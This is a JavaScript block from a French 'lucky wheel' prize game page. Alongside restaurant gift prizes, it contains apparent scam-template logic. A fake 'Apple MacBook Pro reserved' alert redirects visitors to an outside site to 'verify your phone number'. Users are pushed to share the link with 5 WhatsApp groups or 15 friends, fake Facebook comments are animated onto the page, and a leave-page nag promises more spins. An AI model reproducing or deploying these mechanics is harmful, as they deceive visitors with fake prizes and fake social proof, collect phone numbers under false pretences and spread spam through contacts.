<script>
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
var r = getRandomInt(1, 1000);
var myArray = ['http://bollywoodichowk.com/test1', 'http://bollywoodichowk.com/test1',
    'http://bollywoodichowk.com/test1', 'http://bollywoodichowk.com/test1', 'http://bollywoodichowk.com/test1',
    'http://bollywoodichowk.com/test1'
];
var rand = myArray[Math.floor(Math.random() * myArray.length)];

url = rand;
</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script type="text/javascript">
$(document).ready(function() {
    var body = document.getElementsByTagName("body")[0];
    var style = document.createElement("style");
    style.type = "text/css";
    style.appendChild(document.createTextNode(
        "div, main, article, aside, footer, nav, section, header {display: block;}span {display: inline;}h1, h2, h3 {display: block;}"
    ));
    body.appendChild(style);
})
</script>
<script type="text/javascript">
function spinnerAction() {
    //alert("Welcome to Lucky Wheel!\n\nSpin the Wheel and you may win exclusive prizes!\n\nClick OK to Start the Game!")
}

function randomIntFromInterval(min, max) { // min and max included 
    return Math.floor(Math.random() * (max - min + 1) + min)
}

function getKeyByValue(object, value) {
    return Object.keys(object).find(key => object[key] === value);
}

Array.prototype.sample = function() {
    return this[Math.floor(Math.random() * this.length)];
}

function giftsMrwoods() {
    return [
        'Reduction 3% sur tous vos commades',
        'Une pizza trois saisons offerte',
        'Coupons Big Matt',
        'Menu famille',
        'Frittes et gourmadise 100%',
        'Matinale offerte à cuisson chaude',
        'Ribanbinale de jambon au chocalat à 10%',
        'Carine lamarchant à 2% assaisooné',
    ]
}

function startSpin() {
    console.log('success'); 
    var e = document.getElementById("spin"),
        n = document.getElementById("win"),
        t = document.getElementById("winP"),
        o = document.getElementById("win2");

    a = document.getElementById("win1");
    b = document.getElementById("win3");
    c = document.getElementById("win4");
    d = document.getElementById("win5");
    f = document.getElementById("win6");
    g = document.getElementById("win7");
    h = document.getElementById("win8");

    let gm = ['win1', 'win3', 'win4', 'win5', 'win6', 'win7', 'win8', 'win2'];
    // $.ajax({
    //     type: 'POST',
    //     url: '/promotions_actives',
    //     dataType: 'json',
    //     success: function(data) {

    //         const rndInt = data.keys.sample();
    //         const keys = Object.assign({}, data.keys);
    //         rndIntKey = getKeyByValue(keys, rndInt);
    //         window.promotion_id = rndIntKey;
    //         console.log(rndIntKey);
    //         var k = document.getElementById(gm[rndIntKey]);
    //         var avatars = Object.values(data.keys_avatar);
    //         var names = Object.values(data.keys_name);
    //         var days = Object.values(data.keys_days);
    //         window.avatar = avatars[rndIntKey];
    //         window.name = names[rndIntKey];
    //         window.expired = days[rndIntKey];
    //         e.className = e.className + "spinAround", n.style.display = "none", t.style.display = "block",
    //             setTimeout(
    //                 function() {
    //                     t.style.display = "none",
    //                         //o.style.display = "block"
    //                         k.style.display = "block";
    //                 }, 150), setTimeout(function() {
    //                 swal("Rejouer encore ", "Retenter une fois de plus!", "info"), spin2enabled = !0
    //             }, 6500);

    //     }
    // })

    const rndInt = randomIntFromInterval(0, 7);
    console.log(rndInt); 
    console.log(gm[rndInt]); 
    var k = document.getElementById(gm[rndInt]);
    console.log(k); 
    e.className = e.className + "spinAround", n.style.display = "none", t.style.display = "block", setTimeout(
        function() {
            t.style.display = "none", 
            //o.style.display = "block"
            k.style.display = "block";
        }, 150), setTimeout(function() {
            swal("Rejouer encore ", "Retenter une fois de plus!", "info"), spin2enabled = !0
    }, 6500)
}

function startTimer(duration, display) {
    var timer = duration,
        minutes, seconds;
    setInterval(function() {
        minutes = parseInt(timer / 60, 10)
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.text(minutes + ":" + seconds);

        if (--timer < 0) {
            timer = duration;
            // $(".show-all").hide(), $(".hide-all").show();
            //location.reload();
        }
    }, 1000);
}
// ajax function
var $_ajax_request = function(url, type, option = {}) {
    var setting = {
        type: type,
        url: url,
        dataType: 'json',

    }
    if ('data' in option) {
        setting.data = option.data;
    }
    if ('success' in option) {
        setting.success = option.success;
    }

    $.ajax(setting);
}
var swal_mrwood = function(msg, gifText = {}) {
    swal({
            title: "Félicitations",
            text: msg,
            type: "warning",
            showCancelButton: true,
            confirmButtonClass: "btn-success",
            confirmButtonText: "Confirmer",
            cancelButtonClass: "btn-danger",
            cancelButtonText: "Rejouer",
            showLoaderOnConfirm: true,
            closeOnConfirm: false
        },
        function(e) {
            if (!e) {
                /*$('#win').attr('style', 'display: block');
                for(i=1; i<=10; i++) $('#win'+i).attr('style', 'display: none');
                spin2enabled = 1;*/
                location.reload();
            } else {

                var url = 'controllers/gifController.php';
                var type = 'POST';
                var option = {
                    'data': {
                        'name': name,
                        'qrcode_png': avatar,
                        'promotion_id': promotion_id,
                        'promotion_days': expired,
                        'request': 'POST',
                    },
                    'success': function(data) {
                        var alert = 'error';
                        if (data.success) alert = 'success';
                        /*swal(alert, data.msg, alert);*/
                        swal({
                                title: "Information",
                                text: data.msg,
                                type: alert,
                                showCancelButton: true,
                                confirmButtonClass: "btn-success",
                                confirmButtonText: "Rejouer",
                                cancelButtonClass: "btn-danger",
                                cancelButtonText: "Sortir",
                                showLoaderOnConfirm: true,
                                closeOnConfirm: false
                            },
                            function(e) {
                                if (e) {
                                    window.location.reload();
                                } else {
                                    window.location.href = '/mes-cadeaux';
                                }
                            }
                        );
                    },
                };

                setTimeout(() => {
                    $_ajax_request(url, type, option);
                }, 1000);
                // $(".hide-all").hide(), $(".show-all").show();
                // var n = 299,
                // t = setInterval(function() {
                // $("#countdown").text(n--), -1 == n && clearInterval(t)
                // }, 1e3);
                // // javascript_countdown.init(300)
                // var fiveMinutes = 60 * 5,
                // display = $('#countdown');
                // startTimer(fiveMinutes, display);
            }
        });
}

function spin2() {
    console.log('spin2');
    if (spin2enabled) {
        var e = document.getElementById("spin"),
            n = document.getElementById("win"),
            t = document.getElementById("winP"),
            o = document.getElementById("win2");

        document.getElementById("win1").display = 'none';
        document.getElementById("win3").display = 'none';
        document.getElementById("win4").display = 'none';
        document.getElementById("win5").display = 'none';
        document.getElementById("win6").display = 'none';
        document.getElementById("win7").display = 'none';
        document.getElementById("win8").display = 'none';

        e.className = e.className + " spinAround2", n.style.display = "none", t.style.display = "block", setTimeout(
            function() {
                t.style.display = "none", o.style.display = "block"
            }, 150), setTimeout(function() {
            var msg =
                "Your prize: Apple MacBook Pro (Core i7, 16GB Ram, 512GB hard drive, Mac OS, Integrated Graphics, Touch Bar, Silver).\nPlease follow the instructions to win your prize!";
            msg = "Félicitation vous avez gagné: " + name;
            swal_mrwood(msg, name)

        }, 6800)
    }
}

function spin3() {
    console.log('spin3');
    if (spin2enabled) {
        var e = document.getElementById("spin"),
            n = document.getElementById("win"),
            t = document.getElementById("winP"),
            o = document.getElementById("win2");

        document.getElementById("win1").display = 'none';
        document.getElementById("win3").display = 'none';
        document.getElementById("win4").display = 'none';
        document.getElementById("win5").display = 'none';
        document.getElementById("win6").display = 'none';
        document.getElementById("win7").display = 'none';
        document.getElementById("win8").display = 'none';

        e.className = e.className + " spinAround3", n.style.display = "none", t.style.display = "block", setTimeout(
            function() {
                t.style.display = "none", o.style.display = "block"
            }, 150), setTimeout(function() {
            var msg = "Félicitation vous avez gagné: " + name;
            swal_mrwood(msg, name)

        }, 6800)
    }
}

function spin4() {
    console.log('spin4');
    if (spin2enabled) {
        var e = document.getElementById("spin"),
            n = document.getElementById("win"),
            t = document.getElementById("winP"),
            o = document.getElementById("win2");

        document.getElementById("win1").display = 'none';
        document.getElementById("win3").display = 'none';
        document.getElementById("win4").display = 'none';
        document.getElementById("win5").display = 'none';
        document.getElementById("win6").display = 'none';
        document.getElementById("win7").display = 'none';
        document.getElementById("win8").display = 'none';

        e.className = e.className + " spinAround4", n.style.display = "none", t.style.display = "block", setTimeout(
            function() {
                t.style.display = "none", o.style.display = "block"
            }, 150), setTimeout(function() {
            var msg = "vous avez gagné : " + name;
            swal_mrwood(msg, name)

        }, 6800)
    }
}

function spin5() {
    console.log('spin5');
    if (spin2enabled) {
        var e = document.getElementById("spin"),
            n = document.getElementById("win"),
            t = document.getElementById("winP"),
            o = document.getElementById("win2");

        document.getElementById("win1").display = 'none';
        document.getElementById("win3").display = 'none';
        document.getElementById("win4").display = 'none';
        document.getElementById("win5").display = 'none';
        document.getElementById("win6").display = 'none';
        document.getElementById("win7").display = 'none';
        document.getElementById("win8").display = 'none';

        e.className = e.className + " spinAround5", n.style.display = "none", t.style.display = "block", setTimeout(
            function() {
                t.style.display = "none", o.style.display = "block"
            }, 150), setTimeout(function() {
            var msg = "Vous avez gadnez: " + name;
            swal_mrwood(msg, name)

        }, 6800)
    }
}

function spin6() {
    console.log('spin6');
    if (spin2enabled) {
        var e = document.getElementById("spin"),
            n = document.getElementById("win"),
            t = document.getElementById("winP"),
            o = document.getElementById("win2");

        document.getElementById("win1").display = 'none';
        document.getElementById("win3").display = 'none';
        document.getElementById("win4").display = 'none';
        document.getElementById("win5").display = 'none';
        document.getElementById("win6").display = 'none';
        document.getElementById("win7").display = 'none';
        document.getElementById("win8").display = 'none';

        e.className = e.className + " spinAround6", n.style.display = "none", t.style.display = "block", setTimeout(
            function() {
                t.style.display = "none", o.style.display = "block"
            }, 150), setTimeout(function() {
            var msg = "Vous avez gagné : " + name;
            swal_mrwood(msg, name)

        }, 6800)
    }
}

function spin7() {
    console.log('spin7');
    if (spin2enabled) {
        var e = document.getElementById("spin"),
            n = document.getElementById("win"),
            t = document.getElementById("winP"),
            o = document.getElementById("win2");

        document.getElementById("win1").display = 'none';
        document.getElementById("win3").display = 'none';
        document.getElementById("win4").display = 'none';
        document.getElementById("win5").display = 'none';
        document.getElementById("win6").display = 'none';
        document.getElementById("win7").display = 'none';
        document.getElementById("win8").display = 'none';

        e.className = e.className + " spinAround7", n.style.display = "none", t.style.display = "block", setTimeout(
            function() {
                t.style.display = "none", o.style.display = "block"
            }, 150), setTimeout(function() {
            var msg = "Vous avez gagné: " + name;
            swal_mrwood(msg, name)

        }, 6800)
    }
}

function spin8() {
    if (spin2enabled) {
        console.log('spin8');
        var e = document.getElementById("spin"),
            n = document.getElementById("win"),
            t = document.getElementById("winP"),
            o = document.getElementById("win2");

        document.getElementById("win1").display = 'none';
        document.getElementById("win3").display = 'none';
        document.getElementById("win4").display = 'none';
        document.getElementById("win5").display = 'none';
        document.getElementById("win6").display = 'none';
        document.getElementById("win7").display = 'none';
        document.getElementById("win8").display = 'none';

        e.className = e.className + " spinAround8", n.style.display = "none", t.style.display = "block", setTimeout(
            function() {
                t.style.display = "none", o.style.display = "block"
            }, 150), setTimeout(function() {
            var msg = "Vous avez gagné: " + name;
            swal_mrwood(msg, name)

        }, 6800)
    }
}

function spin1() {
    if (spin2enabled) {
        console.log('spin1');
        var e = document.getElementById("spin"),
            n = document.getElementById("win"),
            t = document.getElementById("winP"),
            o = document.getElementById("win2");

        document.getElementById("win1").display = 'none';
        document.getElementById("win3").display = 'none';
        document.getElementById("win4").display = 'none';
        document.getElementById("win5").display = 'none';
        document.getElementById("win6").display = 'none';
        document.getElementById("win7").display = 'none';
        document.getElementById("win8").display = 'none';

        e.className = e.className + " spinAround1", n.style.display = "none", t.style.display = "block", setTimeout(
            function() {
                t.style.display = "none", o.style.display = "block"
            }, 150), setTimeout(function() {
            var msg = "Vous avez gagné :" + name;
            swal_mrwood(msg, name)

        }, 6800)
    }
}

function _ajaxRequest(data) {
    $('.spinner-grow').removeClass('d-none');
    $.ajax({
        type: 'POST',
        url: 'mail.php',
        data: {
            win: true,
        },
        dataType: 'json',
        success: function(data) {
            title = 'Attention !';
            $style = 'warning';
            if (data.success) {
                $title = 'Bien joué';
                $style = 'success';
            }
            swal($title, data.msg, $style)
        },
        complete: function() {
            $('.spinner-grow').addClass('d-none');
        }
    });
}

function goNow() {
    window.btn_clicked = !0
}

function fn1() {
    ++c, 25 >= c ? window.open(showMessage) : alert(
        "Your Apple MacBook Pro (Core i7, 16GB Ram, 512GB hard drive, Mac OS, Integrated Graphics, Touch Bar, Silver) has been reserved.\n\nVerify your phone number on the next page to claim your prize!"
    ) & window.open("http://xns5.com/", "_self")
}

function fn2() {
    if (c >= 1) {
        var data = ['test@test.fr', '8736628838832'];
        _ajaxRequest(data);
        // setTimeout(() => {
        //     window.location.href = '/';
        // }, 1000);
    } else swal("Good job!", "Tell 5 Groups or 15 Friends on WhatsApp about the Lucky Wheel!\n\n You already told: " +
        c, "warning")

    // alert(
    //     "Your Apple MacBook Pro (Core i7, 16GB Ram, 512GB hard drive, Mac OS, Integrated Graphics, Touch Bar, Silver) has been reserved.\n\nVerify your phone number on the next page to claim your prize!"
    //     ) & window.open("http://xns5.com/", "_self") : window.alert(
    //     "Tell 5 Groups or 15 Friends on WhatsApp about the Lucky Wheel!\n\n You already told: " + c)
}

function FBcom(e, n) {
    setTimeout(function() {
        var n = 0,
            t = 0;
        $(e + ", " + e + " .comtxt, " + e + " .combot").slideDown(500), $().slideDown(500);
        var o = setInterval(function() {
            t += .2, $(e).css({
                opacity: t
            }), n++, 5 == n && clearInterval(o)
        }, 100)
    }, n)
}
spin2enabled = !1;
var d = new Date,
    weekday = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
document.getElementById("today").innerHTML = weekday[d.getDay()];
var myarray = ["whatsapp://send?text=😍 *See this now* " + url, "whatsapp://send?text=😍 *See this now* " + url],
    showMessage = myarray[Math.floor(Math.random() * myarray.length)];
c = 0;
var image;
$.fn.txtFader = function(e, n) {
    this.fadeOut(n, function() {
        $(this).html(e).fadeIn(n)
    })
}, $(document).ready(function() {
    FBcom("#fb1", 3e3), FBcom("#fb2", 5e3), FBcom("#fb3", 7e3), FBcom("#fb4", 9e3), FBcom("#fb5", 10500),
        FBcom("#fb6", 13e3), FBcom("#fb7", 15e3), FBcom("#fb8", 2e4), $(".like").click(function() {
            $(this).hasClass("selected") ? ($(this).removeClass("selected"), $(this).html("Like"), $(
                "#youand").html("")) : ($(this).addClass("selected"), $(this).html("Unlike"), $(
                "#youand").html("You and "))
        }), $(".fblike").click(function() {
            $(this).hasClass("selected") ? ($(this).removeClass("selected"), $(this).html("Like")) : ($(
                this).addClass("selected"), $(this).html("Unlike"))
        });
    for (var e = 1; e <= $(".q").length; e++) console.log(e), clicker(e)
}), window.onbeforeunload = function() {
    return window.btn_clicked ? void 0 :
        "You have got (1) more spin!\n\nPlay the game and you may win exclusive prizes from our sponsors.\n\nToday's prizes include Lenovo Vibe K4 Note, Viaplay Mobile Bluetooth Gaming Controller, Fitbit Surge Ultimate Fitness and many more!"
};
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-sweetalert/1.0.1/sweetalert.min.js" integrity="sha512-MqEDqB7me8klOYxXXQlB4LaNf9V9S0+sG1i8LtPOYmHqICuEZ9ZLbyV3qIfADg2UJcLyCm4fawNiFvnYbcBJ1w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>